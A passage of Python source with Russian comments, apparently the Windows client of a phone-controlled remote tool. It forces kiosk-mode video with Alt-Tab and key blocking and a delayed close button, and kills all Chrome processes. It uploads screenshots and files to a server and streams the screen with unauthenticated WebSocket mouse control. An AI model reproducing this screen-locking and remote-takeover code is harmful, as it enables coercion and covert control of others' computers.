        # Восстанавливаем Win-клавишу
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(k)
            user32.SendMessageW(0xFFFF, 0x001A, 0, "Policy")
        except Exception:
            pass
        log.info("Keyboard hook removed")

    _kbd_hook_thread = threading.Thread(target=_hook_thread, daemon=True)
    _kbd_hook_thread.start()
    stop_evt.wait(timeout=2)


def _find_chrome() -> str:
    paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return "chrome.exe"


# ── Локальный HTTP-сервер для видео (нужен для звука в Chrome) ───────────────

_http_server      = None
_http_server_port = 0
_http_serve_dir   = ""

def _start_video_http_server(directory: str) -> int:
    """Запускает однопоточный HTTP-сервер для раздачи файлов из directory.
    Возвращает порт."""
    global _http_server, _http_server_port, _http_serve_dir
    import http.server, socketserver

    # Если уже запущен для той же папки — переиспользуем
    if _http_server and _http_serve_dir == directory:
        return _http_server_port

    # Останавливаем старый если был
    if _http_server:
        try:
            _http_server.shutdown()
        except Exception:
            pass

    _http_serve_dir = directory

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *a, **kw):
            super().__init__(*a, directory=directory, **kw)
        def log_message(self, *a):
            pass  # тихий режим

    # Порт 0 → ОС выдаст свободный
    srv = socketserver.TCPServer(("127.0.0.1", 0), Handler)
    srv.allow_reuse_address = True
    port = srv.server_address[1]

    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()

    _http_server      = srv
    _http_server_port = port
    log.info(f"Video HTTP server on port {port}, dir={directory}")
    return port


def _make_video_html(video_filename: str, duration: int = 0) -> str:
    """Возвращает HTML-строку с плеером.
    video_filename — только имя файла (не путь), файл раздаётся через localhost.
    Особенности:
     - YouTube-style прогресс-бар (только читать, нельзя кликнуть)
     - Кнопка +5 сек (перематывает видео, но НЕ засчитывается в таймер)
     - Таймер обратного отсчёта
    """
    return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
  * {{ margin:0; padding:0; box-sizing:border-box }}
  html,body {{ background:#000; width:100vw; height:100vh; overflow:hidden;
               font-family:'Segoe UI',sans-serif }}
  video {{ width:100%; height:calc(100vh - 56px); object-fit:contain; display:block }}

  /* ── Bottom bar ── */
  #bar {{
    position:fixed; bottom:0; left:0; right:0; height:56px;
    background:linear-gradient(90deg,#0f0f1a,#1a1a2e,#0f0f1a);
    display:flex; align-items:center; gap:12px; padding:0 18px;
    border-top:1px solid rgba(79,70,229,.35);
  }}

  /* Progress track */
  #prog-wrap {{
    flex:1; height:4px; background:rgba(255,255,255,.15); border-radius:2px;
    position:relative; cursor:default; overflow:visible;
  }}
  #prog-fill {{
    height:100%; width:0%; background:linear-gradient(90deg,#4f46e5,#7c3aed);
    border-radius:2px; pointer-events:none;
    transition:width .25s linear;
  }}
  /* Thumb dot */
  #prog-thumb {{
    position:absolute; top:50%; right:0;
    width:12px; height:12px; margin-top:-6px; margin-right:-6px;
    background:#7c3aed; border-radius:50%;
    box-shadow:0 0 6px #7c3aed;
    pointer-events:none;
  }}

  /* Time label */
  #time-lbl {{
    color:rgba(255,255,255,.55); font-size:13px; white-space:nowrap;
    min-width:90px; text-align:center;
  }}

  /* Timer badge */
  #timer {{
    background:rgba(79,70,229,.25); border:1px solid rgba(79,70,229,.5);
    color:#a5b4fc; font-size:13px; padding:4px 14px; border-radius:20px;
    white-space:nowrap; display:none;
  }}

  /* Skip button */
  #skip-btn {{
    background:rgba(255,255,255,.08); border:1px solid rgba(255,255,255,.18);
    color:rgba(255,255,255,.7); font-size:12px; padding:5px 13px;
    border-radius:16px; cursor:pointer; white-space:nowrap;
    transition:background .15s,color .15s;
    user-select:none;
  }}
  #skip-btn:hover {{ background:rgba(124,58,237,.4); color:#fff; border-color:#7c3aed }}
  #skip-btn:active {{ background:rgba(124,58,237,.7) }}

  /* Skip flash */
  #skip-flash {{
    position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
    color:#a5b4fc; font-size:22px; font-weight:bold;
    background:rgba(79,70,229,.25); padding:10px 28px; border-radius:14px;
    opacity:0; pointer-events:none; transition:opacity .15s;
  }}
</style>
</head>
<body>
<video id="v" loop playsinline>
  <source src="/{video_filename}" type="video/mp4">
</video>

<div id="bar">
  <div id="prog-wrap">
    <div id="prog-fill"><div id="prog-thumb"></div></div>
  </div>
  <div id="time-lbl">0:00 / 0:00</div>
  <div id="timer"></div>
  <div id="skip-btn">+5 сек ⏩</div>
</div>
<div id="skip-flash">+5 сек</div>

<script>
  // Block navigation
  window.addEventListener('beforeunload', function(e) {{
    e.preventDefault(); e.returnValue = ''; return '';
  }});
  history.pushState(null,'',location.href);
  window.addEventListener('popstate',function(){{
    history.pushState(null,'',location.href);
  }});

  var v    = document.getElementById('v');
  var fill = document.getElementById('prog-fill');
  var tlbl = document.getElementById('time-lbl');
  var tmr  = document.getElementById('timer');
  var skip = document.getElementById('skip-btn');
  var flash= document.getElementById('skip-flash');

  function fmt(s) {{
    s = Math.floor(s);
    return Math.floor(s/60) + ':' + ('0'+(s%60)).slice(-2);
  }}

  // Autoplay with sound
  v.volume = 1.0;
  v.play().catch(function() {{
    v.muted = true;
    v.play().then(function() {{ v.muted = false; }});
  }});

  // Progress bar update
  v.addEventListener('timeupdate', function() {{
    if (!v.duration) return;
    var pct = (v.currentTime / v.duration) * 100;
    fill.style.width = pct + '%';
    tlbl.textContent = fmt(v.currentTime) + ' / ' + fmt(v.duration);
  }});

  // No seek on click (YouTube-style: read-only bar)
  document.getElementById('prog-wrap').addEventListener('click', function(e) {{
    e.stopPropagation();
  }});

  // Skip +5s (does NOT count toward timer)
  var flashTimer = null;
  skip.addEventListener('click', function() {{
    v.currentTime = Math.min(v.currentTime + 5, v.duration - 0.1);
    flash.style.opacity = '1';
    if (flashTimer) clearTimeout(flashTimer);
    flashTimer = setTimeout(function() {{ flash.style.opacity = '0'; }}, 700);
  }});

  // Countdown timer (watch-time lock) — separate from video position
  var dur = {duration};
  if (dur > 0) {{
    tmr.style.display = 'block';
    var rem = dur;
    tmr.textContent = '⏱ ' + rem + ' сек';
    var iv = setInterval(function() {{
      rem--;
      if (rem <= 0) {{ clearInterval(iv); tmr.style.display='none'; }}
      else tmr.textContent = '⏱ ' + rem + ' сек';
    }}, 1000);
  }}
</script>
</body>
</html>"""


def _get_video_duration(video_path: str) -> float:
    """Определяет длительность видео в секундах. Возвращает 0 если не удалось."""
    # Метод 1: ffprobe
    try:
        result = subprocess.run(
            ["ffprobe", "-v", "error", "-show_entries", "format=duration",
             "-of", "default=noprint_wrappers=1:nokey=1", video_path],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            return float(result.stdout.strip())
    except Exception:
        pass
    # Метод 2: cv2
    try:
        import cv2
        cap = cv2.VideoCapture(video_path)
        fps = cap.get(cv2.CAP_PROP_FPS)
        frames = cap.get(cv2.CAP_PROP_FRAME_COUNT)
        cap.release()
        if fps > 0 and frames > 0:
            return frames / fps
    except Exception:
        pass
    return 0.0


def _show_survey_screen(survey: list, chat_id: str, fb_mode: str,
                         reply_prompt: str):
    """Показывает отдельный полноэкранный опросник поверх всего."""
    import math, random as _rnd2

    root2 = tk.Tk()
    root2.overrideredirect(True)
    root2.attributes("-topmost", True)
    sw = root2.winfo_screenwidth()
    sh = root2.winfo_screenheight()
    root2.geometry(f"{sw}x{sh}+0+0")
    root2.configure(bg="#0d0d0d")

    canvas = tk.Canvas(root2, bg="#0d0d0d", highlightthickness=0)
    canvas.place(relwidth=1, relheight=1)

    answers  = []
    q_index  = [0]
    qs = survey if fb_mode == "survey" else []
    total_q  = len(qs) if qs else 1

    # ── Центральная карточка ──────────────────────────────────────────────────
    card_w, card_h = min(sw - 80, 700), 340
    cx = (sw - card_w) // 2
    cy = (sh - card_h) // 2

    card_bg = "#1a1a2e"
    accent  = "#4f46e5"
    txt_col = "#f0f0f0"
    sub_col = "#888"

    # Рисуем скруглённый прямоугольник через polygon
    def rounded_rect(cv, x, y, w, h, r, **kw):
        pts = [
            x+r, y,   x+w-r, y,
            x+w, y,   x+w,   y+r,
            x+w, y+h-r, x+w, y+h,
            x+w-r, y+h, x+r, y+h,
            x, y+h,  x, y+h-r,
            x, y+r,  x, y,
            x+r, y,
        ]
        return cv.create_polygon(pts, smooth=True, **kw)

    shadow = rounded_rect(canvas, cx+6, cy+6, card_w, card_h, 28,
                          fill="#000000", outline="")
    card   = rounded_rect(canvas, cx, cy, card_w, card_h, 28,
                          fill=card_bg, outline="#2a2a4a", width=2)

    # Прогресс-бар
    bar_y  = cy + card_h - 12
    bar_x0 = cx + 28
    bar_x1 = cx + card_w - 28
    canvas.create_rectangle(bar_x0, bar_y-4, bar_x1, bar_y+4,
                            fill="#222", outline="", width=0)
    prog_bar = canvas.create_rectangle(bar_x0, bar_y-4, bar_x0, bar_y+4,
                                       fill=accent, outline="")

    def update_progress(idx):
        frac = (idx) / total_q
        canvas.coords(prog_bar, bar_x0, bar_y-4,
                      bar_x0 + (bar_x1 - bar_x0) * frac, bar_y+4)

    # Счётчик вопросов
    counter_id = canvas.create_text(cx + card_w - 36, cy + 24,
                                    text=f"1 / {total_q}",
                                    fill=sub_col,
                                    font=("Segoe UI", 11))

    # Текст вопроса
    q_text = qs[0] if qs else reply_prompt
    q_id   = canvas.create_text(cx + card_w//2, cy + 110,
                                 text=q_text,
                                 fill=txt_col,
                                 font=("Segoe UI", 18, "bold"),
                                 width=card_w - 80,
                                 anchor="center", justify="center")

    # ── Поле ввода и кнопка через tk widgets поверх canvas ───────────────────
    entry_frame = tk.Frame(root2, bg=card_bg, bd=0)
    entry_frame.place(x=cx+28, y=cy+180, width=card_w-56, height=48)

    entry_inner = tk.Frame(entry_frame, bg="#252540", bd=0)
    entry_inner.pack(fill="both", expand=True)

    entry = tk.Entry(entry_inner,
                     font=("Segoe UI", 14),
                     bg="#252540", fg=txt_col,
                     insertbackground=accent,
                     relief="flat", bd=10,
                     highlightthickness=2,
                     highlightcolor=accent,
                     highlightbackground="#333360")
    entry.pack(fill="both", expand=True)
    entry.focus_force()

    send_frame = tk.Frame(root2, bg=card_bg, bd=0)
    send_frame.place(x=cx + card_w//2 - 90, y=cy+250, width=180, height=46)

    # Взрыв частиц при отправке
    particles = []

    def explode(bx, by):
        for _ in range(30):
            angle  = random.uniform(0, 2 * math.pi)
            speed  = random.uniform(4, 14)
            size   = random.randint(4, 10)
            color  = _rnd2.choice(["#4f46e5", "#7c3aed", "#a78bfa",
                                    "#e879f9", "#ffffff", "#c4b5fd"])
            vx = math.cos(angle) * speed
            vy = math.sin(angle) * speed
            pid = canvas.create_oval(bx-size//2, by-size//2,
                                     bx+size//2, by+size//2,
                                     fill=color, outline="")
            particles.append([pid, bx, by, vx, vy, 1.0, size])
        _animate_particles()

    def _animate_particles():
        alive = []
        for p in particles:
            pid, px, py, vx, vy, alpha, size = p
            if alpha <= 0:
                canvas.delete(pid)
                continue
            nx, ny = px + vx, py + vy * 0.95
            na = alpha - 0.04
            ns = max(1, size - 0.3)
            canvas.coords(pid, nx-ns//2, ny-ns//2, nx+ns//2, ny+ns//2)
            p[1], p[2], p[4], p[5], p[6] = nx, ny, vy*0.95, na, ns
            alive.append(p)
        particles[:] = alive
        if alive:
            root2.after(16, _animate_particles)

    def do_send():
        answer = entry.get().strip()
        if not answer:
            entry.config(highlightbackground=accent, highlightcolor=accent)
            root2.after(600, lambda: entry.config(highlightbackground="#333360"))
            return

        # Взрыв в центре кнопки
        bx = cx + card_w//2
        by = cy + 270
        explode(bx, by)

        answers.append(answer)
        entry.delete(0, tk.END)

        if fb_mode == "survey" and q_index[0] < len(qs) - 1:
            q_index[0] += 1
            canvas.itemconfig(q_id, text=qs[q_index[0]])
            canvas.itemconfig(counter_id, text=f"{q_index[0]+1} / {total_q}")
            update_progress(q_index[0])
            entry.focus_force()
        else:
            # Финал — анимация успеха и отправка
            canvas.itemconfig(q_id, text="✓  Отправляю...", fill=accent)
            send_btn.config(state="disabled")
            update_progress(total_q)

            def _finish():
                if fb_mode == "survey":
                    result = "\n".join(
                        f"Q: {qs[i]}\nA: {answers[i]}" for i in range(len(answers))
                    )
                else:
                    result = answers[0]
                send_text_reply(chat_id, result)
                root2.after(700, root2.destroy)

            threading.Thread(target=_finish, daemon=True).start()

    send_btn = tk.Button(send_frame,
                         text="Отправить →",
                         font=("Segoe UI", 13, "bold"),
                         bg=accent, fg="white",
                         activebackground="#7c3aed",
                         activeforeground="white",
                         relief="flat", bd=0,
                         cursor="hand2",
                         command=do_send)
    send_btn.pack(fill="both", expand=True)

    # Enter отправляет
    entry.bind("<Return>", lambda e: do_send())

    # Анимация появления карточки (slide up)
    def _slide_in(step=0):
        offset = int(40 * (1 - step/15))
        canvas.move(card,   0, -offset if step == 0 else 0)
        canvas.move(shadow, 0, -offset if step == 0 else 0)
        if step < 15:
            root2.after(16, lambda: _slide_in(step+1))

    root2.after(50, lambda: _slide_in(0))

    update_progress(0)
    root2.mainloop()


def show_video_overlay(video_path: str, lock: bool, duration: int,
                        fb_mode: str, reply_prompt: str, survey: list,
                        chat_id: str):
    global _chrome_proc, _video_stop, _video_window

    _video_stop = threading.Event()
    stop_event  = _video_stop

    video_path = os.path.abspath(video_path)
    video_dir  = os.path.dirname(video_path)
    video_file = os.path.basename(video_path)

    # Определяем длину видео
    video_duration = _get_video_duration(video_path)
    log.info(f"Video duration: {video_duration:.1f}s, requested: {duration}s")

    # duration=0 → смотреть до конца видео
    wait_seconds = duration if duration > 0 else (int(video_duration) if video_duration > 0 else 0)

    # Поднимаем HTTP сервер
    port     = _start_video_http_server(video_dir)
    html_str = _make_video_html(video_file, wait_seconds)

    import tempfile as _tf
    html_fd, html_path = _tf.mkstemp(suffix=".html", dir=video_dir)
    with os.fdopen(html_fd, 'w', encoding='utf-8') as f:
        f.write(html_str)
    html_name = os.path.basename(html_path)
    video_url  = f"http://127.0.0.1:{port}/{html_name}"

    # Убиваем старый Chrome
    subprocess.run(["taskkill", "/f", "/im", "chrome.exe"],
                   capture_output=True, timeout=5)
    time.sleep(0.8)

    chrome_profile = _tf.mkdtemp(prefix="pc_chrome_")
    chrome = _find_chrome()
    _chrome_proc = subprocess.Popen([
        chrome,
        "--kiosk",
        "--no-first-run",
        "--disable-infobars",
        "--disable-session-crashed-bubble",
        "--noerrdialogs",
        "--autoplay-policy=no-user-gesture-required",
        "--disable-popup-blocking",
        f"--user-data-dir={chrome_profile}",
        video_url,
    ])
    log.info(f"Chrome kiosk: {video_url}")

    if lock:
        _block_alttab(True)

    # ── Overlay: нижняя панель в стиле APK ──────────────────────────────────────
    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    sw = root.winfo_screenwidth()
    sh = root.winfo_screenheight()
    # Панель выше HTML-бара Chrome (Chrome kiosk занимает весь экран, tkinter сверху)
    root.geometry(f"{sw}x56+0+{sh-56}")
    _video_window = root

    # Фон панели — тёмный градиент имитируется двумя frame
    bar = tk.Frame(root, bg="#0f0f1a", height=56)
    bar.place(x=0, y=0, width=sw, height=56)

    # Акцентная линия сверху (1px indigo)
    accent_line = tk.Frame(bar, bg="#4f46e5", height=2)
    accent_line.place(x=0, y=0, relwidth=1)

    timer_lbl = tk.Label(bar, text="", bg="#0f0f1a", fg="#a5b4fc",
                          font=("Segoe UI", 13))
    timer_lbl.place(relx=0.5, rely=0.5, anchor="center")

    # Кнопка "Закрыть" — стиль APK: indigo→violet gradient эмулируем фоном
    close_btn = tk.Label(bar, text="✕  Закрыть",
                         font=("Segoe UI", 12, "bold"),
                         bg="#4f46e5", fg="white",
                         padx=22, pady=8, cursor="hand2")

    def _cb_enter(e): close_btn.config(bg="#7c3aed")
    def _cb_leave(e): close_btn.config(bg="#4f46e5")
    close_btn.bind("<Enter>", _cb_enter)
    close_btn.bind("<Leave>", _cb_leave)

    def _kill_chrome():
        try:
            if _chrome_proc:
                _chrome_proc.terminate()
        except Exception:
            pass
        subprocess.run(["taskkill", "/f", "/im", "chrome.exe"],
                       capture_output=True, timeout=5)
        try:
            os.unlink(html_path)
        except Exception:
            pass
        try:
            import shutil
            shutil.rmtree(chrome_profile, ignore_errors=True)
        except Exception:
            pass

    def do_close_and_survey():
        """Закрывает видео, снимает хук, запускает опросник если нужно."""
        stop_event.set()
        if lock:
            _block_alttab(False)
        _kill_chrome()
        global _video_window
        _video_window = None
        try:
            root.destroy()
        except Exception:
            pass
        # Открываем опросник/ответ в новом окне
        if fb_mode in ("survey", "reply") and (survey or fb_mode == "reply"):
            _show_survey_screen(survey, chat_id, fb_mode, reply_prompt)

    def do_close_plain():
        """Просто закрыть, без опросника."""
        stop_event.set()
        if lock:
            _block_alttab(False)
        _kill_chrome()
        global _video_window
        _video_window = None
        try:
            root.destroy()
        except Exception:
            pass

    close_btn.bind("<Button-1>", lambda e: do_close_and_survey())

    def _keep_on_top():
        while not stop_event.is_set():
            time.sleep(1.5)
            try:
                if root.winfo_exists():
                    root.attributes("-topmost", True)
                    root.lift()
            except Exception:
                break
    threading.Thread(target=_keep_on_top, daemon=True).start()

    def unlock_ui():
        """Показать кнопку закрыть после окончания таймера."""
        timer_lbl.place_forget()
        close_btn.place(relx=0.5, rely=0.5, anchor="center")

    if wait_seconds > 0:
        def countdown():
            time.sleep(1)
            for remaining in range(wait_seconds, 0, -1):
                if stop_event.is_set():
                    return
                try:
                    root.after(0, lambda r=remaining: timer_lbl.config(
                        text=f"⏱  {r} сек"))
                except Exception:
                    return
                time.sleep(1)
            if not stop_event.is_set():
                root.after(0, unlock_ui)
        threading.Thread(target=countdown, daemon=True).start()
    else:
        # Нет таймера и нет lock — сразу кнопка
        root.after(500, unlock_ui)

    root.mainloop()


def unban_video():
    global _video_window
    if _video_window:
        try:
            _video_stop.set()
            _block_alttab(False)
            if _chrome_proc:
                _chrome_proc.terminate()
            subprocess.run(["taskkill", "/f", "/im", "chrome.exe"],
                           capture_output=True, timeout=5)
            _video_window.after(0, _video_window.destroy)
            _video_window = None
        except Exception as e:
            log.error(f"unban_video: {e}")

# ─── File picker ─────────────────────────────────────────────────────────────


def open_file_picker(chat_id: str):
    """Open file dialog and upload selected file to server."""
    def _pick():
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        filepath = filedialog.askopenfilename(
            title="Выбери файл для отправки",
            filetypes=[
                ("Все файлы", "*.*"),
                ("Изображения", "*.jpg *.jpeg *.png *.gif *.webp *.bmp"),
                ("Видео",       "*.mp4 *.mov *.avi *.mkv *.3gp"),
            ]
        )
        root.destroy()
        if filepath:
            try:
                http_post_multipart("/upload", filepath, chat_id)
                log.info(f"File uploaded: {filepath}")
            except Exception as e:
                log.error(f"File upload failed: {e}")
    threading.Thread(target=_pick, daemon=True).start()

def take_screenshot(chat_id: str):
    """Делает скриншот всего экрана и отправляет в чат."""
    import tempfile
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
            tmp_path = f.name
        img.save(tmp_path, "PNG")
        http_post_multipart("/upload", tmp_path, chat_id, caption="🖥 Скриншот")
        log.info("Screenshot sent")
    except Exception as e:
        log.error(f"take_screenshot: {e}")
        try:
            http_post_json("/text_reply", {
                "chat_id": chat_id,
                "text": f"⚠️ Ошибка скриншота: {e}",
                "device_id": DEVICE_ID,
            })
        except Exception:
            pass
    finally:
        try:
            os.unlink(tmp_path)
        except Exception:
            pass

# ─── WiFi Screen Streaming (MJPEG, аналог Android ScreenStreamService) ────────
#
# Запускает локальный HTTP-сервер на порту 8080 (MJPEG /stream)
# и WebSocket-сервер на порту 8081 (мышь / клики).
# Браузер на телефоне открывает http://<PC-IP>:8080 и видит экран ПК.
# Управление кликами передаётся через WS и эмулируется через pyautogui.
#
# Зависимости (добавить в requirements.txt):
#   pyautogui>=0.9.54
#   Pillow>=10.0.0  (уже есть)

STREAM_HTTP_PORT = 8080
STREAM_WS_PORT   = 8081
STREAM_FPS       = 15          # кадров в секунду
STREAM_WIDTH     = 1280        # ширина захвата (0 = полный экран)
STREAM_QUALITY   = 60          # JPEG качество 1–95

import socket as _socket
import struct as _struct
import hashlib as _hashlib
import base64 as _base64
import io as _io
from threading import Thread, Event
from typing import Optional
from queue import Queue, Empty

_stream_stop_event: Optional[Event] = None
_stream_ip: str = ""


def _get_local_ip() -> str:
    """Определяет локальный IP в сети (как в Android getLocalIpAddress)."""
    try:
        s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


class _MjpegFrameProvider:
    """Захватывает кадры экрана в фоновом потоке, хранит последний."""
    def __init__(self, stop_event: Event, fps: int, width: int, quality: int):
        self._stop = stop_event
        self._delay = 1.0 / fps
        self._width = width
        self._quality = quality
        self._frame: Optional[bytes] = None
        self._lock = __import__("threading").Lock()

    def get_frame(self) -> Optional[bytes]:
        with self._lock:
            return self._frame

    def run(self):
        import time
        from PIL import Image
        try:
            import mss
            _use_mss = True
        except ImportError:
            _use_mss = False
            log.warning("mss не установлен, использую PIL.ImageGrab")

        if _use_mss:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                while not self._stop.is_set():
                    try:
                        shot = sct.grab(monitor)
                        img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
                        if self._width and img.width > self._width:
                            ratio = self._width / img.width
                            img = img.resize(
                                (self._width, int(img.height * ratio)),
                                resample=Image.LANCZOS
                            )
                        buf = _io.BytesIO()
                        img.save(buf, format="JPEG", quality=self._quality)
                        with self._lock:
                            self._frame = buf.getvalue()
                    except Exception as e:
                        log.error(f"stream frame (mss): {e}")
                    time.sleep(self._delay)
        else:
            from PIL import ImageGrab
            while not self._stop.is_set():
                try:
                    img = ImageGrab.grab(all_screens=True)
                    if self._width and img.width > self._width:
                        ratio = self._width / img.width
                        img = img.resize(
                            (self._width, int(img.height * ratio)),
                            resample=Image.LANCZOS
                        )
                    buf = _io.BytesIO()
                    img.save(buf, format="JPEG", quality=self._quality)
                    with self._lock:
                        self._frame = buf.getvalue()
                except Exception as e:
                    log.error(f"stream frame: {e}")
                time.sleep(self._delay)


def _ws_handshake(conn: _socket.socket) -> bool:
    """Выполняет WebSocket handshake (RFC 6455)."""
    try:
        data = b""
        while b"\r\n\r\n" not in data:
            chunk = conn.recv(4096)
            if not chunk:
                return False
            data += chunk
        headers = {}
        for line in data.decode(errors="ignore").split("\r\n")[1:]:
            if ": " in line:
                k, v = line.split(": ", 1)
                headers[k.strip()] = v.strip()
        key = headers.get("Sec-WebSocket-Key", "")
        magic = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
        accept = _base64.b64encode(
            _hashlib.sha1((key + magic).encode()).digest()
        ).decode()
        resp = (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {accept}\r\n\r\n"
        )
        conn.sendall(resp.encode())
        return True
    except Exception as e:
        log.error(f"ws_handshake: {e}")
        return False


def _ws_read_frame(conn: _socket.socket) -> Optional[str]:
    """Читает один WebSocket фрейм и возвращает строку текста."""
    try:
        header = b""
        while len(header) < 2:
            b = conn.recv(2 - len(header))
            if not b:
                return None
            header += b
        b0, b1 = header
        masked = bool(b1 & 0x80)
        length = b1 & 0x7F
        if length == 126:
            ext = conn.recv(2)
            length = _struct.unpack("!H", ext)[0]
        elif length == 127:
            ext = conn.recv(8)
            length = _struct.unpack("!Q", ext)[0]
        mask_key = conn.recv(4) if masked else b"\x00\x00\x00\x00"
        payload = b""
        while len(payload) < length:
            chunk = conn.recv(length - len(payload))
            if not chunk:
                return None
            payload += chunk
        if masked:
            payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
        return payload.decode("utf-8", errors="ignore")
    except Exception:
        return None


def _handle_ws_client(conn: _socket.socket, stop_event: Event):
    """Обрабатывает одно WebSocket-соединение (клики/мышь)."""
    if not _ws_handshake(conn):
        conn.close()
        return
    import json as _json
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
    except ImportError:
        pyautogui = None
        log.warning("pyautogui не установлен — клики через WS недоступны")

    while not stop_event.is_set():
        msg = _ws_read_frame(conn)
        if msg is None:
            break
        try:
            data = _json.loads(msg)
            t = data.get("type")
            if pyautogui is None:
                continue
            sw = pyautogui.size().width
            sh = pyautogui.size().height
            if t == "tap":
                x = int(data["x"] * sw)
                y = int(data["y"] * sh)
                pyautogui.click(x, y)
                log.info(f"WS tap: {x},{y}")
            elif t == "move":
                x = int(data["x"] * sw)
                y = int(data["y"] * sh)
                pyautogui.moveTo(x, y)
            elif t == "scroll":
                x = int(data["x"] * sw)
                y = int(data["y"] * sh)
                pyautogui.scroll(int(data.get("dy", 0) * -10), x=x, y=y)
        except Exception as e:
            log.error(f"ws msg: {e}")
    conn.close()


def _serve_mjpeg_client(conn: _socket.socket, provider: _MjpegFrameProvider,
                         stop_event: Event):
    """Стримит MJPEG одному HTTP-клиенту."""
    boundary = "PhoneControlBoundary"
    try:
        # Читаем запрос (минимально)
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = conn.recv(4096)
            if not chunk:
                return
            buf += chunk

        headers = (
            "HTTP/1.1 200 OK\r\n"
            f"Content-Type: multipart/x-mixed-replace; boundary={boundary}\r\n"
            "Cache-Control: no-cache\r\n"
            "Access-Control-Allow-Origin: *\r\n"
            "Connection: close\r\n\r\n"
        )
        conn.sendall(headers.encode())

        import time
        delay = 1.0 / STREAM_FPS
        while not stop_event.is_set():
            frame = provider.get_frame()
            if frame is None:
                time.sleep(0.05)
                continue
            part = (
                f"--{boundary}\r\n"
                f"Content-Type: image/jpeg\r\n"
                f"Content-Length: {len(frame)}\r\n\r\n"
            ).encode() + frame + b"\r\n"
            conn.sendall(part)
            time.sleep(delay)
    except Exception:
        pass
    finally:
        try:
            conn.close()
        except Exception:
            pass


def _serve_html(conn: _socket.socket, ip: str):
    """Отдаёт HTML-страницу просмотра (аналог Android serveHtml)."""
    html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<title>PhoneControl Stream — PC</title>
<style>
  * {{ margin:0; padding:0; box-sizing:border-box; }}
  body {{ background:#000; display:flex; flex-direction:column; align-items:center;
         height:100vh; overflow:hidden; font-family:sans-serif; }}
  #screen {{ width:100%; max-height:calc(100vh - 60px); object-fit:contain;
             cursor:crosshair; display:block; }}
  #bar {{ width:100%; height:60px; background:#111; display:flex;
          align-items:center; justify-content:center; gap:16px; }}
  #captureBtn {{ padding:10px 24px; background:#e94560; color:#fff; border:none;
                 border-radius:8px; font-size:16px; cursor:pointer; }}
  #captureBtn.active {{ background:#27ae60; }}
  #status {{ color:#888; font-size:13px; }}
</style>
</head>
<body>
<img id="screen" src="/stream">
<div id="bar">
  <button id="captureBtn" onclick="toggleCapture()">🖱 Перехватить управление</button>
  <span id="status">Просмотр</span>
</div>
<script>
  var capturing = false;
  var ws = new WebSocket('ws://{ip}:{STREAM_WS_PORT}');
  ws.onopen = function() {{ document.getElementById('status').textContent = 'WS подключён'; }}
  ws.onerror = function() {{ document.getElementById('status').textContent = 'WS ошибка'; }}

  function toggleCapture() {{
    capturing = !capturing;
    var btn = document.getElementById('captureBtn');
    var st  = document.getElementById('status');
    btn.textContent = capturing ? '⛔ Отпустить управление' : '🖱 Перехватить управление';
    btn.className   = capturing ? 'active' : '';
    st.textContent  = capturing ? 'Управление активно' : 'Просмотр';
  }}

  var img = document.getElementById('screen');

  img.addEventListener('click', function(e) {{
    if (!capturing) return;
    var r = img.getBoundingClientRect();
    var x = (e.clientX - r.left) / r.width;
    var y = (e.clientY - r.top)  / r.height;
    ws.send(JSON.stringify({{type:'tap', x:x, y:y}}));
  }});

  img.addEventListener('mousemove', function(e) {{
    if (!capturing) return;
    var r = img.getBoundingClientRect();
    var x = (e.clientX - r.left) / r.width;
    var y = (e.clientY - r.top)  / r.height;
    ws.send(JSON.stringify({{type:'move', x:x, y:y}}));
  }});

  img.addEventListener('wheel', function(e) {{
    if (!capturing) return;
    e.preventDefault();
    var r = img.getBoundingClientRect();
    var x = (e.clientX - r.left) / r.width;
    var y = (e.clientY - r.top)  / r.height;
    ws.send(JSON.stringify({{type:'scroll', x:x, y:y, dy:e.deltaY}}));
  }}, {{passive:false}});

  /* Touch (мобильный браузер) */
  var touchStart = null;
  img.addEventListener('touchstart', function(e) {{
    if (!capturing) return;
    e.preventDefault();
    var r = img.getBoundingClientRect();
    var t = e.touches[0];
    touchStart = {{x:(t.clientX-r.left)/r.width, y:(t.clientY-r.top)/r.height}};
  }}, {{passive:false}});

  img.addEventListener('touchend', function(e) {{
    if (!capturing || !touchStart) return;
    e.preventDefault();
    var r = img.getBoundingClientRect();
    var t = e.changedTouches[0];
    var ex = (t.clientX-r.left)/r.width, ey = (t.clientY-r.top)/r.height;
    ws.send(JSON.stringify({{type:'tap', x:touchStart.x, y:touchStart.y}}));
    touchStart = null;
  }}, {{passive:false}});
</script>
</body>
</html>"""
    body = html.encode("utf-8")
    resp = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html; charset=utf-8\r\n"
        f"Content-Length: {len(body)}\r\n"
